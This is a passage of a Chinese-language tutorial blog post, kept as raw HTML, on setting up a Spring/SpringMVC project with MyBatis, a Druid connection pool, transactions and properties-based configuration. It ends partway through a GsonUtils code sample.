id=\"添加Spring配置\"><a href=\"#添加Spring配置\" class=\"headerlink\" title=\"添加Spring配置\"></a>添加Spring配置</h3><p>一般SpringMVC用于与页面数据交互，引入Spring控制后续相关操作，如事务，数据库，以及其他Spring用到的地方。在理论上所有配置配置到SpringMVC中效果也是一样的，在实际中SpringMVC相关配置和Spring相关配置拆分开，系统层次结构更加清晰。<br>步骤：</p>\n<ol>\n<li>配置web.xml启动加载spring</li>\n<li>添加Spring配置文件</li>\n<li>启动服务看是否正常</li>\n</ol>\n<p>操作：<br>在web.xml中添加listener(ContextLoaderListener)</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--配置加载Spring--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context-param</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>contextConfigLocation<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>classpath:applicationContext.xml<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context-param</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">listener</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class=\"tag\">&lt;/<span class=\"name\">listener-class</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">listener</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>ContextLoaderListener实现了ServletContextListener，在服务启动的时候，容器会调用contextInitialized初始化Spring</p>\n</blockquote>\n<p>在resources目录下添加Spring配置文件applicationContext.xml，配置Spring自动扫描</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context:component-scan</span> <span class=\"attr\">base-package</span>=<span class=\"string\">&quot;com.feiniu&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context:component-scan</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>添加Service，启动服务，查看是否有异常。</p>\n<blockquote>\n<p>在使用SpringMVC和Spring配置文件的时候，beans根节点上有个属性default-autowire&#x3D;”byName”，表示在设置bean的时候，自动装配实现。autowire有5种装配模式：</p>\n<ul>\n<li>no：默认，不采用自动装配，需要在配置文件中通过ref标签注入</li>\n<li>byName：通过属性的名称注入</li>\n<li>byType：通过类型自动注入</li>\n<li>constructor：通过构造方法注入，与byType不同在于，如果bean不存在会报错</li>\n<li>default：采用父级标签配置<br>在平常使用注解@Autowired，和byType是一个意思，通过类型注入，如果有多个同类型Bean需要添加注解@Qualifier指定名称</li>\n</ul>\n</blockquote>\n<h4 id=\"Spring相关\"><a href=\"#Spring相关\" class=\"headerlink\" title=\"Spring相关\"></a>Spring相关</h4><p>在Spring容器概念，基本概念可以理解为Spring有一个工厂类用于创建和销毁bean，同时有个Map管理所有bean。延伸出了bean的生命周期、属性管理等其他相关操作。<br>源码阅读入口：<br>web.xml中阅读源码入口：ContextLoaderListener.contextInitialized<br>所有Spring不同容器的最终加载启动入口：AbstractApplicationContext.refresh</p>\n<h3 id=\"添加数据库配置\"><a href=\"#添加数据库配置\" class=\"headerlink\" title=\"添加数据库配置\"></a>添加数据库配置</h3><p>对于数据库操作，一般采用Mybatis。采用Mybatis方便统一管理所有sql，统一sql写在xml配置中，解除程序与sql耦合。方便维护对象和数据库映射关系，相对原生sql编写较简单，且不会过多影响性能。<br>在使用数据的时候，如果频繁创建、释放数据库连接，会产生大量的性能开销，引入数据库连接池，可以让数据库连接得到重用。在启动数据库连接池时，会初始化一部分数据库连接，对于业务而言，直接利用现有可用连接，避免连接初始花费时间。而且入数据库连接池，统一管理数据库连接，避免数据库连接泄露。（采用第三方数据源：druid）</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5teWJhdGlzLm9yZy9zcHJpbmcvemgvaW5kZXguaHRtbA==\">spring-mybatis中文文档<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n<p>步骤：</p>\n<ol>\n<li>配置数据库连接</li>\n<li>配置Mybatis</li>\n<li>启动服务</li>\n</ol>\n<p>操作：<br>添加数据库依赖org.springframework.spring-jdbc、org.mybatis.mybatis、org.mybatis.mybatis-spring、mysql.mysql-connector-java、com.alibaba.druid<br>resources目录添加application-db.xml配置文件，在Spring配置文件中引入该文件</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--配置数据库连接池--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;dataSource&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;com.alibaba.druid.pool.DruidDataSource&quot;</span> <span class=\"attr\">init-method</span>=<span class=\"string\">&quot;init&quot;</span> <span class=\"attr\">destroy-method</span>=<span class=\"string\">&quot;close&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;url&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;jdbc:mysql://localhost:3306/test&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;username&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;test&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;password&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!--在Mybatis中每次操作都依赖于SqlSession，异常sql操作会话，通过SqlSessionFactoryBean，可以不用自己管理SqlSession--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;sessionFactory&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;dataSource&quot;</span> <span class=\"attr\">ref</span>=<span class=\"string\">&quot;dataSource&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- 配置打印Mybatis的sql，online请关闭 --&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--&lt;property name=&quot;configLocation&quot; value=&quot;classpath:mybatis-config.xml&quot; /&gt;--&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--配置扫描sql位置，默认不配置在Mapper同目录--&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\">    &lt;property name=&quot;mapperLocations&quot; value=&quot;classpath*:sqlmap/*-mapper.xml&quot;/&gt;</span></span><br><span class=\"line\"><span class=\"comment\">    --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!--结合spring配置扫描Mapper--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--配置扫描Mapper所在目录--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;basePackage&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;com.feiniu.mapper&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;sqlSessionFactoryBeanName&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;sessionFactory&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>mapper.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">mapper</span> <span class=\"keyword\">PUBLIC</span> <span class=\"string\">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class=\"string\">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span> &gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">mapper</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>添加Mapper和XML中的sql，启动服务，访问是否正常。<br>访问启动正常，但是在访问的时候会报错 <em>org.apache.ibatis.binding.BindingException: Invalid bound statement (not found): com.feiniu.mapper.DemoMapper.countDemo</em> ，这个时候可以看target编译的目录中，并没有mapper.xml，因为如果不额外配置的话，只有src&#x2F;main&#x2F;java下面的java文件编译为class，需要修改pom文件，设置src&#x2F;main&#x2F;java下面资源文件不过滤。如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">resources</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">resource</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">filtering</span>&gt;</span>false<span class=\"tag\">&lt;/<span class=\"name\">filtering</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">directory</span>&gt;</span>src/main/java<span class=\"tag\">&lt;/<span class=\"name\">directory</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">include</span>&gt;</span>**/*.xml<span class=\"tag\">&lt;/<span class=\"name\">include</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">include</span>&gt;</span>**/*.properties<span class=\"tag\">&lt;/<span class=\"name\">include</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">resource</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"配置事务\"><a href=\"#配置事务\" class=\"headerlink\" title=\"配置事务\"></a>配置事务</h3><p>因为spring-jdbc中已经包含了事务所需要的jar包，所以不需要额外配置相关依赖<br>修改applicationContext-db.xml添加事务支持</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--添加数据库是否操作--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;transactionManager&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">class</span>=<span class=\"string\">&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;dataSource&quot;</span> <span class=\"attr\">ref</span>=<span class=\"string\">&quot;dataSource&quot;</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!--开启事务注解--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">tx:annotation-driven</span> <span class=\"attr\">transaction-manager</span>=<span class=\"string\">&quot;transactionManager&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<p>启动服务测试事务是否生效。启动服务正常，但是事务不会生效。<br>因为在事务等配置是写在Spring的配置文件中，在配置扫描的时候，Spring和SpringMVC都扫描到Controller和Service导致，所配置的扫描对象会在Controller和Service中个存在一份，用户访问时，先通过SpringMVC的servelt获取的MVC中对象，直到DAO中获取不到实例，从父容器中获取。而事务又是配置Spring容器中，导致事务失效。可以在Controller和Service中都注入ApplicationContext，比较下两边的容器。<br>解决办法：修改MVC容器只能加载Controller，Spring容器加载非Controller<br>spring-servlet.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context:component-scan</span> <span class=\"attr\">base-package</span>=<span class=\"string\">&quot;com.feiniu&quot;</span> <span class=\"attr\">use-default-filters</span>=<span class=\"string\">&quot;false&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">context:include-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;annotation&quot;</span> <span class=\"attr\">expression</span>=<span class=\"string\">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context:component-scan</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>applicationContext.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context:component-scan</span> <span class=\"attr\">base-package</span>=<span class=\"string\">&quot;com.feiniu&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">context:exclude-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;annotation&quot;</span> <span class=\"attr\">expression</span>=<span class=\"string\">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context:component-scan</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>修改后测试事务是否生效。</p>\n<ul>\n<li>在使用注解Transactional时，如果不写rollbackFor，默认只回滚RuntimeException、Error，具体源码可以查看RuleBasedTransactionAttribute的父类DefaultTransactionAttribute中rollbackOn</li>\n</ul>\n<h4 id=\"事务相关\"><a href=\"#事务相关\" class=\"headerlink\" title=\"事务相关\"></a>事务相关</h4><p>事务特性：</p>\n<blockquote>\n<ul>\n<li>事务是一个原子操作，由一系列动作组成。事务的原子性确保动作要么全部完成，要么完全不起作用。</li>\n<li>一旦事务完成（不管成功还是失败），系统必须确保它所建模的业务处于一致的状态，而不会是部分完成部分失败。在现实中的数据不应该被破坏。</li>\n<li>可能有许多事务会同时处理相同的数据，因此每个事务都应该与其他事务隔离开来，防止数据损坏。</li>\n<li>一旦事务完成，无论发生什么系统错误，它的结果都不应该受到影响，这样就能从任何系统崩溃中恢复过来。通常情况下，事务的结果被写到持久化存储器中。</li>\n</ul>\n</blockquote>\n<p>对于Spring而言，Spring并不直接管理事务，Spring提供了事务管理器接口PlatformTransactionManager，把事务管理职责委托给各个平台，入JDBC(org.springframework.jdbc.datasource.DataSourceTransactionManager)、Hibernate(org.springframework.orm.hibernate3.HibernateTransactionManager)等事务管理器。<br>Spring接口TransactionDefinition定义了5个事务隔离级别：</p>\n<blockquote>\n<ul>\n<li>ISOLATION_DEFAULT（默认）：使用数据库默认的事务隔离级别.另外四个与JDBC的隔离级别相对应</li>\n<li>ISOLATION_READ_UNCOMMITTED：这是事务最低的隔离级别，它充许别外一个事务可以看到这个事务未提交的数据。这种隔离级别会产生脏读，不可重复读和幻像读。</li>\n<li>ISOLATION_READ_COMMITTED：保证一个事务修改的数据提交后才能被另外一个事务读取。另外一个事务不能读取该事务未提交的数据。这种事务隔离级别可以避免脏读出现，但是可能会出现不可重复读和幻像读。（MYSQL默认事务级别）</li>\n<li>ISOLATION_REPEATABLE_READ：这种事务隔离级别可以防止脏读，不可重复读。但是可能出现幻像读。它除了保证一个事务不能读取另一个事务未提交的数据外，还保证了避免下面的情况产生(不可重复读)。</li>\n<li>ISOLATION_SERIALIZABLE：这是花费最高代价但是最可靠的事务隔离级别。事务被处理为顺序执行。除了防止脏读，不可重复读外，还避免了幻像读。</li>\n</ul>\n</blockquote>\n<p>Spring接口TransactionDefinition定义了7个事务传播行为：</p>\n<blockquote>\n<ul>\n<li>PROPAGATION_REQUIRED：支持当前事务，如果当前没有事务，就新建一个事务。这是最常见的选择，也是 Spring 默认的事务的传播。</li>\n<li>PROPAGATION_SUPPORTS：如果存在一个事务，支持当前事务。如果没有事务，则非事务的执行。但是对于事务同步的事务管理器，PROPAGATION_SUPPORTS与不使用事务有少许不同。</li>\n<li>PROPAGATION_MANDATORY：如果已经存在一个事务，支持当前事务。如果没有一个活动的事务，则抛出异常。</li>\n<li>PROPAGATION_REQUIRES_NEW：总是开启一个新的事务。如果一个事务已经存在，则将这个存在的事务挂起。</li>\n<li>PROPAGATION_NOT_SUPPORTED：总是非事务地执行，并挂起任何存在的事务。使用PROPAGATION_NOT_SUPPORTED,也需要使用JtaTransactionManager作为事务管理器。</li>\n<li>PROPAGATION_NEVER：总是非事务地执行，如果存在一个活动事务，则抛出异常。</li>\n<li>PROPAGATION_NESTED：如果一个活动的事务存在，则运行在一个嵌套的事务中. 如果没有活动事务, 则按TransactionDefinition.PROPAGATION_REQUIRED 属性执行。</li>\n</ul>\n</blockquote>\n<p>在使用事务传播行为时，如果没有深刻理解，随意使用会导致出现意外情况。</p>\n<h3 id=\"配置properties配置文件\"><a href=\"#配置properties配置文件\" class=\"headerlink\" title=\"配置properties配置文件\"></a>配置properties配置文件</h3><p>在项目中有很多基本数据是写在配置文件中，需要配置Spring读取配置文件，或者在Spring配置文件中有${}表达式时，通过配置文件设置值。减少每次需要修改代码。<br>resources目录下添加conf&#x2F;local&#x2F;application.properties配置文件</p>\n<figure class=\"highlight properties\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">####################  mysql数据库  ######################</span></span><br><span class=\"line\"><span class=\"attr\">mysql.jdbc.driver</span>=<span class=\"string\">com.mysql.jdbc.Driver</span></span><br><span class=\"line\"><span class=\"attr\">mysql.jdbc.user</span>=<span class=\"string\">test</span></span><br><span class=\"line\"><span class=\"attr\">mysql.jdbc.password</span>=<span class=\"string\">password</span></span><br><span class=\"line\"><span class=\"attr\">mysql.jdbc.alias</span>=<span class=\"string\">feiniu_proxool</span></span><br><span class=\"line\"><span class=\"attr\">mysql.jdbc.url</span>=<span class=\"string\">jdbc:mysql://localhost:3306/test?characterEncoding=utf-8&amp;useUnicode=true&amp;zeroDateTimeBehavior=convertToNull&amp;allowMultiQueries=true</span></span><br><span class=\"line\"><span class=\"attr\">mysql.jdbc.maximum-connection-count</span>=<span class=\"string\">20</span></span><br><span class=\"line\"><span class=\"attr\">mysql.jdbc.minimum-connection-count</span>=<span class=\"string\">1</span></span><br><span class=\"line\"><span class=\"attr\">mysql.jdbc.simultaneous-build-throttle</span>=<span class=\"string\">5</span></span><br><span class=\"line\"><span class=\"attr\">mysql.jdbc.verbose</span>=<span class=\"string\">true</span></span><br><span class=\"line\"><span class=\"attr\">mysql.jdbc.trace</span>=<span class=\"string\">true</span></span><br><span class=\"line\"><span class=\"attr\">mysql.jdbc.fatal-sql-exception</span>=<span class=\"string\">Fatal error</span></span><br><span class=\"line\"><span class=\"attr\">mysql.jdbc.prototype-count</span>=<span class=\"string\">5</span></span><br><span class=\"line\"><span class=\"attr\">mysql.jdbc.statistics-log-level</span>=<span class=\"string\">ERROR</span></span><br><span class=\"line\"><span class=\"attr\">mysql.jdbc.maximum-active-time</span>=<span class=\"string\">600000</span></span><br><span class=\"line\"><span class=\"attr\">mysql.jdbc.house-keeping-test-sql</span>=<span class=\"string\">SELECT CURRENT_DATE</span></span><br><span class=\"line\"><span class=\"comment\">#######################################################################</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">#################################  本地配置  #################################</span></span><br><span class=\"line\"><span class=\"attr\">fn.env</span>=<span class=\"string\">dev</span></span><br><span class=\"line\"><span class=\"comment\">##############################################################################</span></span><br></pre></td></tr></table></figure>\n<p>在applicationContext.xml中添加：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context:property-placeholder</span> <span class=\"attr\">location</span>=<span class=\"string\">&quot;classpath:/config/local/*.properties&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>\n<p>修改applicationContext-db.xml中配置的url、user、password</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;dataSource&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;com.alibaba.druid.pool.DruidDataSource&quot;</span> <span class=\"attr\">init-method</span>=<span class=\"string\">&quot;init&quot;</span> <span class=\"attr\">destroy-method</span>=<span class=\"string\">&quot;close&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;url&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;$&#123;mysql.jdbc.url&#125;&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;username&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;$&#123;mysql.jdbc.user&#125;&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;$&#123;mysql.jdbc.password&#125;&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>启动测试连接数据库是否正常。<br>如果需要在实例中注入配置文件中配置，可以使用注解@Value。<br>在公司里，启动时，把所有配置文件加载进一个类的静态属性中，这样保证了在应用任何地方可以随意读取配置。<br>添加类SystemEnv保存所有配置：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SystemEnv</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">Logger</span> <span class=\"variable\">log</span> <span class=\"operator\">=</span> LoggerFactory.getLogger(SystemEnv.class);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> <span class=\"type\">Properties</span> <span class=\"variable\">systemProperties</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Properties</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">addProperty</span><span class=\"params\">(Properties properties)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (properties != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (Object key : properties.keySet()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (key != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (systemProperties.keySet().contains(key)) &#123;</span><br><span class=\"line\">                        log.error(<span class=\"string\">&quot;系统Property配置项 &#123;&#125; 重复&quot;</span>, key);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    systemProperties.put(key, properties.get(key));</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title function_\">getProperty</span><span class=\"params\">(String key, String defaultValue)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">value</span> <span class=\"operator\">=</span> systemProperties.getProperty(key);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> value != <span class=\"literal\">null</span>? value: defaultValue;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Properties <span class=\"title function_\">getProperties</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> systemProperties;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>新增一个类PropertyPlaceholderConfigurerEx加载读取配置文件，继承PropertyPlaceholderConfigurer，覆盖父类方法processProperties，在Spring加载配置文件后，把配置文件加载进系统。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">PropertyPlaceholderConfigurerEx</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">PropertyPlaceholderConfigurer</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">processProperties</span><span class=\"params\">(ConfigurableListableBeanFactory beanFactoryToProcess, Properties props)</span> <span class=\"keyword\">throws</span> BeansException &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>.processProperties(beanFactoryToProcess, props);</span><br><span class=\"line\">        SystemEnv.addProperty(props);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>删除之前applicationContext.xml中添加的加载properties文件。在resources下新增applicationContext-config.xml，在applicationContext.xml中引入该配置。<br>applicationContext-config.xml：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;com.feiniu.config.PropertyPlaceholderConfigurerEx&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;locations&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">            <span class=\"comment\">&lt;!--覆盖默认配置--&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>classpath:config/local/*.properties<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">property</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>启动测试是否正常。</p>\n<ul>\n<li>PropertyPlaceholderConfigurer类实现了BeanFactoryPostProcessor，在Spring启动的时候回调用所有实现了BeanFactoryPostProcessor接口的postProcessBeanFactory方法。</li>\n</ul>\n<h3 id=\"统一出入参数\"><a href=\"#统一出入参数\" class=\"headerlink\" title=\"统一出入参数\"></a>统一出入参数</h3><p>一般项目中存在后台访问和对外API接口，对外API中一般要求统一入参、出参。<br>添加自定义消息转换器，统一处理返回参数格式。添加Gson依赖com.google.code.gson.gson。设置接口入参params&#x3D;{}，json出参{code:200, msg:”xxx”, data:xxx}<br>步骤：</p>\n<ol>\n<li>编写GsonUtils</li>\n<li>添加统一出参Vo</li>\n<li>添加入参数验证</li>\n<li>配置自定义消息转换器</li>\n</ol>\n<p>操作：<br>GsonUtils.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">GsonUtils</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">Gson</span> <span class=\"variable\">gson</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">GsonBuilder</span>().create();</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">Gson</span> <span class=\"variable\">gsonFormat</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">GsonBuilder</span>().setDateFormat(<span class=\"string\">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>).create();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Gson <span class=\"title function_\">createGson</span><span 